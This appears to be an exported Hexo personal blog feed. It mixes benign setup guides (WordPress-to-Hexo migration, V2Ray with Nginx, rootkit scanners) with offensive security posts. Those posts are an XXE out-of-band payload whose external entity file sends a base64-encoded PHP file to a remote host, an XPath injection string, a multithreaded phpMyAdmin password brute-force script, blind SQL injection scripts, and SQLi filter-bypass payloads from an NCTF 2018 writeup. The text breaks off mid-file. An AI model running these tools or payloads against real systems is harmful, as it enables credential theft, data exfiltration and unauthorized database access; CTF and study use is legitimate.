    </entry>
    
    
    
    <entry>
      <title>wordpress迁移hexo</title>
      <link href="/2021/11/23/wordpress-qian-yi-hexo/"/>
      <url>/2021/11/23/wordpress-qian-yi-hexo/</url>
      
        <content type="html"><![CDATA[<h2 id="迁移原因"><a href="#迁移原因" class="headerlink" title="迁移原因"></a>迁移原因</h2><p>vps到期，忘记了续费，导致博客直接没了。</p><p>为了防止以后还会忘记续费，决定改用 hexo 做博客，并且属实白嫖了github  cloudflare-cdn。</p><h2 id="步骤记录"><a href="#步骤记录" class="headerlink" title="步骤记录"></a>步骤记录</h2><h3 id="1-导出wordpress文章"><a href="#1-导出wordpress文章" class="headerlink" title="1. 导出wordpress文章"></a>1. 导出wordpress文章</h3><p>使用工具-导出-所有内容 导出xml格式的文章，保存到本地用于后续使用</p><img src="/assets/image-20211124140635988.png" alt="image-20211124140635988" style="zoom: 67%;"><h3 id="2-创建Hexo项目"><a href="#2-创建Hexo项目" class="headerlink" title="2. 创建Hexo项目"></a>2. 创建Hexo项目</h3><h4 id="2-1-安装-npm-amp-git"><a href="#2-1-安装-npm-amp-git" class="headerlink" title="2.1 安装 npm&amp;git"></a>2.1 安装 npm&amp;git</h4><ul><li>Node.js：<a href="https://link.zhihu.com/?target=https://nodejs.org/zh-cn">https://nodejs.org/zh-cn</a></li><li>Git：<a href="https://link.zhihu.com/?target=https://git-scm.com/downloads">https://git-scm.com/downloads</a></li></ul><p>下载 Node.js 和 Git 程序并安装，一路点 “下一步” 按默认配置完成安装。</p><p>安装完成后，Win+R 输入 cmd 并打开，依次输入 <code>node -v</code>、<code>npm -v</code> 和 <code>git --version</code> 并回车，如下图出现程序版本号即可。</p><h4 id="2-2-Github-创建-username-github-io-仓库"><a href="#2-2-Github-创建-username-github-io-仓库" class="headerlink" title="2.2 Github 创建 [username].github.io 仓库"></a>2.2 Github 创建 [username].github.io 仓库</h4><img src="/assets/image-20211124141319324.png" alt="image-20211124141319324" style="zoom: 80%;"><h4 id="2-3-git-ssh-配置"><a href="#2-3-git-ssh-配置" class="headerlink" title="2.3 git ssh 配置"></a>2.3 git ssh 配置</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"用户名"</span></code></pre><p>生成 ssh 密钥对（默认生成在 用户家目录/.ssh 文件夹下，如之前生成过，此步骤可跳过）</p><pre class="language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa   <span class="token comment">#一路回车</span></code></pre><p>添加公钥到github:</p><p>进入 用户家目录 .ssh 目录(如Windows C:\Users\用户名.ssh),复制 id_rsa.pub 文件内容。</p><p>登陆 GitHub ，进入 Settings 页面，选择左边栏的 SSH and GPG keys，点击 New SSH key。将复制的公钥粘贴后保存即可。</p><img src="/assets/image-20211124142149199.png" alt="image-20211124142149199" style="zoom:80%;"><p>测试：</p><p>在git bash 或 终端中输入 <code>ssh -T git@github.com</code> ，信任证书后，若出现 成功认证，即可。</p><h4 id="2-4-安装hexo"><a href="#2-4-安装hexo" class="headerlink" title="2.4 安装hexo"></a>2.4 安装hexo</h4><p>新建一个空文件夹，用于存放 hexo 项目文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装 hexo</span><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span class="token comment">#初始化</span>hexo init<span class="token comment">#安装组件</span><span class="token function">npm</span> <span class="token function">install</span><span class="token comment">#生成页面</span>hexo g<span class="token comment">#启动预览</span>hexo s</code></pre><p>此时，正常情况下访问 <code>http://localhost:4000</code> 能看到本地博客</p><h3 id="3-同步Hexo到github-pages"><a href="#3-同步Hexo到github-pages" class="headerlink" title="3.同步Hexo到github pages"></a>3.同步Hexo到github pages</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装hexo-deployer-git</span><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save</code></pre><p>修改项目根目录下的 <strong>_config.yml</strong> 文件</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">deploy</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> git  <span class="token key atrule">repository</span><span class="token punctuation">:</span> git@github.com<span class="token punctuation">:</span>用户名/用户名.github.io.git  <span class="token key atrule">branch</span><span class="token punctuation">:</span> main</code></pre><p>修改完成后，运行 <code>hexo d</code> 将网站部署到 Github Pages上</p><p>此时，访问 <code>https://用户名.github.io</code> 应当可以看见Hexo网站。</p><h3 id="4-绑定自定义域名"><a href="#4-绑定自定义域名" class="headerlink" title="4.绑定自定义域名"></a>4.绑定自定义域名</h3><p>注册域名及解析域名到 github pages 的设置本文不做记录</p><p>打开博客所在 GitHub 仓库，Settings -&gt; 下拉找到 GitHub Pages -&gt;custom domain ，填入自己的域名，配置如下图。</p><p>进入本地博客 source 目录，创建 文件  CNAME ，内容为 自己的域名，如 xxx.cn</p><pre class="language-bash" data-language="bash"><code class="language-bash">hexo clean   <span class="token comment"># 清除缓存文件等</span>hexo g       <span class="token comment"># 生成页面</span>hexo s       <span class="token comment"># 启动预览</span></code></pre><p>完成后再次访问博客，应当会被自动重定向到我们的域名。</p><h3 id="5-开启HTTPS"><a href="#5-开启HTTPS" class="headerlink" title="5.开启HTTPS"></a>5.开启HTTPS</h3><p>配置自己的域名后，需要我们手动开启 HTTPS。打开博客所在 GitHub 仓库，Settings -&gt; 下拉找到 GitHub Pages -&gt; 勾选 Enforce HTTPS。<img src="/assets/image-20211124144109626.png" alt="image-20211124144109626" style="zoom:80%;"></p><p>过几分钟，应当可以看见博客使用https访问（原理是 github 帮我们申请了我们域名的免费https 证书）</p><h3 id="6-使用-cloudflare-免费CDN加速访问（可选）"><a href="#6-使用-cloudflare-免费CDN加速访问（可选）" class="headerlink" title="6.使用 cloudflare 免费CDN加速访问（可选）"></a>6.使用 cloudflare 免费CDN加速访问（可选）</h3><p>通过<a href="https://dash.cloudflare.com/sign-up%E9%93%BE%E6%8E%A5%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%86%8C%EF%BC%8C%E6%B3%A8%E5%86%8C%E5%AE%8C%E6%88%90%E5%90%8E%EF%BC%8C%E5%B0%86%E8%87%AA%E5%B7%B1%E7%9A%84%E7%AB%99%E7%82%B9%E6%B7%BB%E5%8A%A0cloudflare">https://dash.cloudflare.com/sign-up链接进行注册，注册完成后，将自己的站点添加cloudflare</a></p><img src="/assets/image-20211124144407583.png" alt="image-20211124144407583" style="zoom: 80%;"><p>添加 DNS 记录，此处可直接通过 cname 的方式完成解析</p><img src="/assets/image-20211124132055800.png" alt="image-20211124132055800" style="zoom:80%;"><p>配置完成后，根据cloudflare的要求，需要将域名的DNS服务器改为cloudflare的地址，此处提供腾讯云注册域名修改方法，其他域名服务商请自行搜索修改方法。</p><p>腾讯云：访问 <a href="https://console.cloud.tencent.com/domain">https://console.cloud.tencent.com/domain</a> ，点击域名后方 管理 按钮</p><p><img src="/assets/image-20211124145102060.png" alt="image-20211124145102060"></p><p>在页面下方点击修改即可,修改完成后需一定时间等待同步</p><img src="/assets/image-20211124145205531.png" alt="image-20211124145205531" style="zoom: 67%;"><p>配置cloudflare ssl，选择 Full或Full(strict) 模式</p><p><img src="/assets/image-20211124145339039.png" alt="image-20211124145339039"></p><h3 id="7-更换主题"><a href="#7-更换主题" class="headerlink" title="7.更换主题"></a>7.更换主题</h3><ul><li>在 <a href="https://link.zhihu.com/?target=https://hexo.io/themes/">Themes | Hexo</a> 选择一个喜欢的主题</li><li>在 github 搜索 Hexo themes，选择自己喜欢的主题，按照主题安装教程进行安装，此处不做记录</li></ul><h3 id="8-导入WordPress文章"><a href="#8-导入WordPress文章" class="headerlink" title="8.导入WordPress文章"></a>8.导入WordPress文章</h3><p>首先，安装 <code>hexo-migrator-wordpress</code> 插件。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装插件</span><span class="token function">npm</span> <span class="token function">install</span> hexo-migrator-wordpress --save<span class="token comment">#导入WordPress文章</span>hexo migrate wordpress <span class="token operator">&lt;</span>source<span class="token operator">&gt;</span></code></pre><p>导入后，手动到 source/_post 目录查看markdown源文件(存在一些文章是空的情况)，解决图片附件链接是否正常(如果不是用的外链，此处需要将WordPress的 uploads 文件夹放到 public 文件夹中，并校对文件路径是否正确)</p><h3 id="9-创建私有项目，同步-amp-备份源文件"><a href="#9-创建私有项目，同步-amp-备份源文件" class="headerlink" title="9.创建私有项目，同步&amp;备份源文件"></a>9.创建私有项目，同步&amp;备份源文件</h3><p>如有在多个设备编写博客的需求，或需要备份博客源文件，可采用 共享文件夹等方式实现。本博客本着与github俱存亡的理念，将源文件也同步到github 私有项目。</p><p>在github创建一个私有项目，随后将本地文件同步到github 私有项目中。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> init<span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span><span class="token function">git</span> commit -m <span class="token string">"update"</span><span class="token function">git</span> remote <span class="token function">add</span> origin git@github.com:yourname/youremail.git<span class="token function">git</span> push -u origin main</code></pre><p>后面为了方便，创建了两个 bat 文件，一键 部署博客，一键 同步源文件。方便使用</p><h3 id="10-配置-typora"><a href="#10-配置-typora" class="headerlink" title="10.配置 typora"></a>10.配置 typora</h3><p>考虑到免费图床需要实时网络，并且可能会倒闭。图片及附件直接放置在本地文件中，部署时同步到github中。</p><p>本文使用 typora 编辑器，配置方式如下：</p><ol><li><p>在source 目录下创建 assert 目录，用于存放附件</p></li><li><p>配置typora如下</p><p><img src="/assets/image-20211124153253713.png" alt="image-20211124153253713"></p></li><li><p>修改 scaffolds 中的 post 默认模板，添加 <code>typora-root-url</code> 变量，值为 <code>..</code>  ,例如</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">title</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">{</span> title <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">{</span> date <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token key atrule">tags</span><span class="token punctuation">:</span><span class="token key atrule">typora-root-url</span><span class="token punctuation">:</span> ..</code></pre></li></ol><p>其他如主题的配置，也遇到一些问题，需要看主题的文档及issue 进行解决。</p><h3 id="11-Mac-多平台协同配置"><a href="#11-Mac-多平台协同配置" class="headerlink" title="11.Mac 多平台协同配置"></a>11.Mac 多平台协同配置</h3><p>考虑到需要在mac上同步写博客，使用github 做同步（顺便把备份问题解决掉）</p><p>以下为操作步骤：</p><ol><li><p>首先在github上新建一个私有项目 myblog</p></li><li><p>删除主题中带有 .git 的文件夹 (github 嵌套 的git项目源文件无法上传到github)</p></li><li><p>Windows：在本地文件中创建 .gitignore 文件，文件内容如下</p><pre class="language-none"><code class="language-none">.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/</code></pre></li><li><p>Windows：在hexo项目根目录，初始化git，并将项目push到私有项目 myblog上</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> init<span class="token function">git</span> remote <span class="token function">add</span> origin git@github.com:AspirePig/myblog.git<span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span><span class="token function">git</span> commit -m <span class="token string">"update"</span><span class="token function">git</span> push -u origin main</code></pre></li><li><p>Mac：安装好npm，hexo ，clone项目，并在其他目录初始化一个 hexo 项目，将其中的node_modules 目录拷贝到 clone 下来的 目录中</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli  <span class="token comment">#安装hexo</span><span class="token function">mkdir</span> hexo_tmp <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> hexo_tmphexo init   <span class="token comment">#初始化一个hexo项目</span><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token function">git</span> clone git@github.com:AspirePig/myblog.git<span class="token function">cp</span> -rf hexo_tmp/node_modules myblog/   <span class="token comment">#复制一个初始化好的node_modules</span><span class="token builtin class-name">cd</span> myblog<span class="token function">npm</span> <span class="token function">install</span>  <span class="token comment">#自动安装好在Windows上安装过的模块</span><span class="token comment">#r如果安装慢，可以更改npm 源</span><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org</code></pre></li><li><p>Mac：修改文章，测试各是否正常可用</p><pre class="language-bash" data-language="bash"><code class="language-bash">hexo ghexo shexo d</code></pre></li><li><p>测试通过后，上传到git项目，并在Windows测试是否正常</p></li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/60578464">https://zhuanlan.zhihu.com/p/60578464</a></li><li><a href="https://hexo.io/zh-cn/docs/migration.html#WordPress">https://hexo.io/zh-cn/docs/migration.html#WordPress</a></li><li><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md</a></li><li><a href="https://monkeywie.cn/2020/08/20/fast-github-page-with-cloudflare/">https://monkeywie.cn/2020/08/20/fast-github-page-with-cloudflare/</a></li><li><a href="https://blog.csdn.net/hehung/article/details/103430545">https://blog.csdn.net/hehung/article/details/103430545</a></li><li><a href="https://blog.csdn.net/weixin_42474261/article/details/84476050">https://blog.csdn.net/weixin_42474261/article/details/84476050</a></li></ul><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> 图床问题 ✅ </li><li><input disabled="" type="checkbox"> 资料修改完善 </li><li><input checked="" disabled="" type="checkbox"> 多电脑编辑 ✅</li><li><input checked="" disabled="" type="checkbox"> cdn加速 ✅</li><li><input checked="" disabled="" type="checkbox"> 留言板✅ gittalk，存在安全问题，使用小号注册</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> wordpress </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML相关安全问题</title>
      <link href="/2021/11/01/xml-xiang-guan-an-quan-wen-ti/"/>
      <url>/2021/11/01/xml-xiang-guan-an-quan-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>利用payload,盲注</p><p><a href="https://blog.csdn.net/nzjdsds/article/details/98763063">https://blog.csdn.net/nzjdsds/article/details/98763063</a></p><pre class="language-none"><code class="language-none">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY\[&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php"&gt;&lt;!ENTITY % remote SYSTEM "https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/evil.xml"&gt;%remote;%all;\]&gt;&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;aaa&lt;/password&gt;&lt;/user&gt;</code></pre><p><a href="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/evil.xml">https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/evil.xml</a></p><pre class="language-none"><code class="language-none">\[root@Asp blog\]# cat evil.xml&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/1.php?file=%file;'&gt;"&gt;</code></pre><p>xpath注入</p><pre class="language-none"><code class="language-none">[https://www.cnblogs.com/backlion/p/8554749.html](https://www.cnblogs.com/backlion/p/8554749.html)//users/user\[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''=''\]</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>V2RAY+Nginx+TLS+ws搭建方案</title>
      <link href="/2020/02/24/v2raynginxtlsws-da-jian-fang-an/"/>
      <url>/2020/02/24/v2raynginxtlsws-da-jian-fang-an/</url>
      
        <content type="html"><![CDATA[<p>当前ss和ssr已经无法很好的隐藏，使用V2RAY可以伪装成各种协议，此处不再细说其好处和区别。以下为安装过程</p><h2 id="0x00：安装V2RAY"><a href="#0x00：安装V2RAY" class="headerlink" title="0x00：安装V2RAY"></a>0x00：安装V2RAY</h2><p>Linux系统中直接使用以下命令进行一键安装：</p><p><code>bash &lt;(curl -L -s https://install.direct/go.sh)</code></p><p>安装完成后，修改配置文件 <code>/etc/v2ray/config.json</code> 如下：</p><pre class="language-none"><code class="language-none">{   "inbounds": \[     {       "listen": "127.0.0.1",       "port": 2333,       "protocol": "vmess",       "settings": {         "clients": \[           {             "id": "b1d53297-870d-4967-9ff0-f16aa315ddde",             "alterId": 64           }         \]       },       "streamSettings": {         "network": "ws",         "wsSettings": {         "path": "/blog"         }       }     }   \],   "outbounds": \[     {       "protocol": "freedom",       "settings": {}     }   \] }</code></pre><p>V2RAY常用控制命令：</p><p>systemctl stauts v2ray<br>systemctl start v2ray<br>systemctl stop v2ray<br>systemctl restart v2ray<br>systemctl enable v2ray</p><h2 id="0x01：https证书申请"><a href="#0x01：https证书申请" class="headerlink" title="0x01：https证书申请"></a>0x01：https证书申请</h2><p>此处我是直接从腾讯云申请的一年免费ssl证书，上传到VPS上，过程忽略</p><h2 id="0x02：Nginx-配置"><a href="#0x02：Nginx-配置" class="headerlink" title="0x02：Nginx 配置"></a>0x02：Nginx 配置</h2><pre class="language-none"><code class="language-none">server    {    listen 443 ssl http2;    server_name     myblog.xxx;    index index.html index.htm ;    root  /home/wwwroot/v2ray;    ssl_certificate /usr/local/nginx/conf/ssl/v2ray.crt;    ssl_certificate_key /usr/local/nginx/conf/ssl/v2ray.key;    ssl_session_timeout 5m;    ssl_protocols TLSv1 TLSv1.1 TLSv1.3;    ssl_prefer_server_ciphers on;    ssl_ciphers "TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-128-CCM-8-SHA256:TLS13-AES-128-CCM-SHA256:EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5";    ssl_session_cache builtin:1000 shared:SSL:10m;    # openssl dhparam -out /usr/local/nginx/conf/ssl/dhparam.pem 2048    ssl_dhparam /usr/local/nginx/conf/ssl/dhparam.pem;    location /blog {        proxy_redirect off;        proxy_pass http://127.0.0.1:2333;        proxy_http_version 1.1;        proxy_set_header Upgrade $http_upgrade;        proxy_set_header Connection "upgrade";        proxy_set_header Host $http_host;    }}</code></pre><h2 id="0x03：客户端配置"><a href="#0x03：客户端配置" class="headerlink" title="0x03：客户端配置"></a>0x03：客户端配置</h2><p>服务端启动后，客户端按刚才的配置进行填写，如图，需要注意id、alterid、path需与服务器配置对应</p><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2020/02/image-792x1024.png"></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 下安装使用chkrootkit和rootkit hunter</title>
      <link href="/2018/12/08/linux-xia-an-zhuang-shi-yong-chkrootkit-he-rootkit-hunter/"/>
      <url>/2018/12/08/linux-xia-an-zhuang-shi-yong-chkrootkit-he-rootkit-hunter/</url>
      
        <content type="html"><![CDATA[<h2 id="chkrootkit安装及使用"><a href="#chkrootkit安装及使用" class="headerlink" title="chkrootkit安装及使用"></a>chkrootkit安装及使用</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.从官网下载http://www.chkrootkit.org/<span class="token number">2</span>.解压压缩包文件<span class="token function">tar</span> -zxvf chkrootkit.tar.gz <span class="token number">3</span>.编译<span class="token function">make</span> sense <span class="token number">4</span>.运行./chkrootkit </code></pre><hr><h2 id="rootkit-hunter安装使用"><a href="#rootkit-hunter安装使用" class="headerlink" title="rootkit hunter安装使用"></a>rootkit hunter安装使用</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>.下载最新文件https://sourceforge.net/projects/rkhunter/files/<span class="token number">2</span>.解压压缩包文件<span class="token function">tar</span> -zxvf rkhunter-1.4.6.tar.gz<span class="token number">3</span>.安装./installer.sh --install<span class="token number">4</span>.运行rkhunter --check --skrkhunter -c --sk --rwo</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 密码爆破脚本python 多线程</title>
      <link href="/2018/11/30/phpmyadmin-mi-ma-bao-po-jiao-ben-python-duo-xian-cheng/"/>
      <url>/2018/11/30/phpmyadmin-mi-ma-bao-po-jiao-ben-python-duo-xian-cheng/</url>
      
        <content type="html"><![CDATA[<pre class="language-none"><code class="language-none">#!/usr/bin/env/python# -*- coding: utf-8 -*-import requestsimport reimport HTMLParserimport threadingurl = 'https://xxx.cn/phpMyAdmin/index.php'count = 0flag = 0user_list = ['root','mysql','guest','test']pwdfilename = 'risk2.txt'def getpassword(user,password):    ss=requests.session()    r = ss.get(url)    tmpsession = re.findall(r'phpMyAdmin=(.*?);', r.headers['Set-Cookie'])    left = r.content.rfind('name="token" value="')    tmp = r.content[left+20:]    right = tmp.find('" /&gt;&lt;/fieldset&gt;')    token = tmp[:right]    # print token    http_parser = HTMLParser.HTMLParser();      token = http_parser.unescape(token);      post_data={"set_session":tmpsession[2],"pma_username":user,"pma_password":password,"server":"1","target":"index.php","token":token}    r2 = ss.post(url,data=post_data,allow_redirects=False)    # print post_data    if r2.status_code == 302:        print "Find PASSWORD!!!!!!:"+user+":"+password        flag = 1        exit()for user in user_list:    print "开始破解 "+user+"密码"    for line in open(pwdfilename,'r'):        password = line.strip()        t = threading.Thread(target=getpassword, args=(user, password))        t.start()        # getpassword(user, password)        count += 1        # print countif flag:    print "破解结束"else:    print "破解结束:未成功破解"</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python SQL盲注脚本</title>
      <link href="/2018/11/30/sql-mang-zhu-jiao-ben/"/>
      <url>/2018/11/30/sql-mang-zhu-jiao-ben/</url>
      
        <content type="html"><![CDATA[<h1 id="基于布尔盲注"><a href="#基于布尔盲注" class="headerlink" title="基于布尔盲注"></a>基于布尔盲注</h1><hr><pre class="language-none"><code class="language-none">#!/usr/bin/env pythonimport requests#dbs#SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA#tables#SELECT GROUP_CONCAT(table_NAME) FROM information_schema.tables where table_schema=database()#columns#SELECT GROUP_CONCAT(column_NAME) FROM information_schema.columns where table_name='flag'#data#SELECT GROUP_CONCAT(flag) FROM flag#payload = "id=2%20and%20ascii(substr((SELECT flag FROM flag),{0},1))={1}"flag = ''maxlength = 30chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#$%^&amp;*()'host = 'http://ctf.cdusec.org:8084/sqli.php?'payload = "id=2%20and%20ascii(substr((SELECT flag FROM flag),{0},1))={1}"for i in xrange(1, maxlength):    for x in chars:        url = host + payload.format(str(i), ord(x))        # print url        req = requests.get(url)        if 'YES' in req.content:            flag = flag + x            print flag            break</code></pre><h1 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h1><hr><pre class="language-none"><code class="language-none">#!/usr/bin/env pythonimport requests#dbs#SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA#tables#SELECT GROUP_CONCAT(table_NAME) FROM information_schema.tables where table_schema=database()#columns#SELECT GROUP_CONCAT(column_NAME) FROM information_schema.columns where table_name='flag'#data#SELECT GROUP_CONCAT(flag) FROM flag#payload = "id=2%20and%20 if((ascii(substr((SELECT flag FROM flag),{0},1))={1}),sleep(3),NULL)"flag = ''maxlength = 30chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@#$%^&amp;*()'host = 'http://ctf.cdusec.org:8084/sqli.php?'payload = "id=2%20and%20 if((ascii(substr((SELECT flag FROM flag),{0},1))={1}),sleep(3),NULL)"for i in xrange(1, maxlength):    for x in chars:        url = host + payload.format(str(i), ord(x))        # print url        try:            r = requests.get(url, timeout=2)        except requests.exceptions.ReadTimeout:            flag += x            print flag            break</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NCTF 2018 Writeup</title>
      <link href="/2018/11/26/nctf-writeup/"/>
      <url>/2018/11/26/nctf-writeup/</url>
      
        <content type="html"><![CDATA[<p>这两天和其他大佬参加了NCTF，题目质量不错。我主要负责做web题，期间也去尝试了下pwn的签到，学习了如何使用zio、pwntools。。。最后团队取得了总榜第9的成绩。 <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/860d441b119f5067f5b0f6f64d663cee.png"> <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/bbbbcaf4496afcbc9bf785cb24e55402.png"></p><hr><h1 id="WEB："><a href="#WEB：" class="headerlink" title="WEB："></a>WEB：</h1><hr><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题:"></a>签到题:</h2><hr><p>点开题目地址会直接跳转到百度，bp抓包重放下得到flag，不过响应头中的flag才是真正的flag(皮的一匹) <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/8419ff353800dd9af78dd3d1aad614ad.png"> &nbsp;</p><h2 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡:"></a>滴！晨跑打卡:</h2><hr><p>访问后是一个可以输入数字查询对应打卡信息的页面，应该是sql注入：<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/bc456e1ed0688062730d2bf0401de8c5.png"> 经过尝试，题目过滤了 “空格”,”*“,”-“，可以使用如下代替：</p><pre class="language-none"><code class="language-none">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/   两个空格代替一个空格，用Tab代替空格，%a0=空格：</code></pre><p>如下payload都可以取出flag：</p><pre class="language-none"><code class="language-none">http://ctfgame.acdxvfsvd.net:20001/?id=99999'%a0union%a0select%a0user(),(SELECT%a0GROUP_CONCAT(th1s_1s_flag%a0SEPARATOR%a00x3c62723e)%a0FROM%a0flaaaaaaag.f144444444g),3'1http://ctfgame.acdxvfsvd.net:20001/index.php?id=999999'union(SELECT%0bGROUP_CONCAT(th1s_1s_flag),2,3%0bFROM%0bflaaaaaaag.f144444444g%0b);%00盲注payload："http://ctfgame.acdxvfsvd.net:20001/index.php?id=2%27substr((select(th1s_1s_flag)from(flaaaaaaag.f144444444g)limit%0b0,1),"+str(i)+",1)='"+chr(j)</code></pre><p><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/0d09b48904574a4cc80be509b08a21cf.png"> 附上sql绕过方法:<a href="http://www.cnblogs.com/Vinson404/p/7253255.html">http://www.cnblogs.com/Vinson404/p/7253255.html</a></p><h2 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers:"></a>Go Lakers:</h2><hr><p>和签到题一样，打开会自动跳转到百度，bp抓包重放，返回包拉到最下面可以看见post me viewsource<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/2093a0bb02703e0b877c1eeb591539a1.png"></p><p>然后，修改包为POST数据包，添加上:</p><pre class="language-none"><code class="language-none">Content-Type: application/x-www-form-urlencoded</code></pre><p>即可看到返回的源码<img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/404977b1a19d3d6c99a00882d6cd07b2.png"> 由于编码问题，需要导出为html文件，用浏览器打开即可</p><pre class="language-none"><code class="language-none">&lt;?php error_reporting(0); include 'getip.php'; ini_set('open_basedir','.'); if(isset($_POST['viewsource'])){     highlight_file(__FILE__);     die(); } mt_srand(mktime()+$seed); function de_code($value){     $value = base64_decode($value);     $result = '';     for($i=0;$i&lt;strlen($value);$i++){         $result .= chr(ord($value[$i])-$i*2);     }     return $result; } if(!(getip() === '127.0.0.1' &amp;&amp; file_get_contents($_GET['9527']) === 'nctf_is_good' &amp;&amp; mt_rand(1,10000) === intval($_GET['go_Lakers']))){     header('location:http://www.baidu.com'); }else{     echo 'great'; } echo file_get_contents(de_code($_GET['file_'])); ?&gt; </code></pre><p>仔细阅读可以发现，除了<code>post viewsource</code>时，整个脚本只会结束到die那意外，其他情况都是会执行到最后的</p><pre class="language-none"><code class="language-none">echo file_get_contents(de_code($_GET['file_'])); </code></pre><p>所以，我们需要利用这个点进行文件读取，<code>$_GET['file_']</code>经过<code>de_code</code>函数加密，所以这里传入的值应该是加密后的字符串，写出加密函数:</p><pre class="language-none"><code class="language-none">function en_code($value){    $result = '';     for($i=0;$i&lt;strlen($value);$i++){         $result .= chr(ord($value[$i])+$i*2);     }    $result = base64_encode($result);    return $result;}</code></pre><p>对<code>flag.php</code>加密：<code>Zm5lbTZ6dH4=</code>请求后得到flag <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/11/5120453c797acafd6e24a91c26d3c75d.png"> 题外话：前面的IP、9527、随机数都是迷惑条件。。。 通过读取<code>getip.php</code>可以看到<code>getip.php</code>源码</p><pre class="language-none"><code class="language-none">&lt;?php$seed = '2163713';function getip(){        if($_SERVER['HTTP_X_FORWARDED_FOR']){            die('X_FORWARDED_FOR is good,but can you find another one?');        } elseif($_SERVER['HTTP_CLIENT_IP']){            $ip = $_SERVER['HTTP_CLIENT_IP'];        } else{            $ip 